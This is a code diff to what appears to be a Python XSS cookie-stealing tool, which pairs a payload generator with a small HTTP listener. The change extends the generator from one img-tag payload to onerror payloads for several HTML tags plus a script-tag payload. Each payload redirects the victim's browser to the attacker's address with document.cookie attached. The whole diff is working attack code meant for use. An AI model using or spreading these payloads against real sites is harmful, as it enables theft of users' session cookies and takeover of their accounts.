@@ -6,11 +6,28 @@ import http.server
 import socketserver
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
-def generatePayload(type, address, port):
-    if type == "img":
-        return '<img src="#" onerror="javascript:document.location=\'http://%s:%d/?x=\'+document.cookie">' % (address, port)
+def getCookieAddress(address, port):
+    if port == 80:
+        return "'http://%s/?x='+document.cookie" % address
     else:
+        return "'http://%s:%d/?x='+document.cookie" % (address, port)
+
+def generatePayload(type, address, port):
+
+    payloads = []
+    cookieAddress = getCookieAddress(address, port)
+
+    media_tags = ["img","audio","video","image","body","script","object"]
+    if type in media_tags:
+        payloads.append('<%s src=1 href=1 onerror="javascript:document.location=%s">' % (type, cookieAddress))
+
+    if type == "script":
+        payloads.append('<script type="text/javascript">document.location=%s</script>' % cookieAddress)
+
+    if len(payloads) == 0:
         return None
+
+    return "\n".join(payloads)
 
 class XssServer(BaseHTTPRequestHandler):
     def _set_headers(self):
@@ -54,7 +71,7 @@ if __name__ == "__main__":
 
     payload = generatePayload(payload_type, local_address, listen_port)
     if not payload:
-        print("Unsupported payload type, choose one of: img")
+        print("Unsupported payload type")
         exit(1)
 
     print("Payload:")
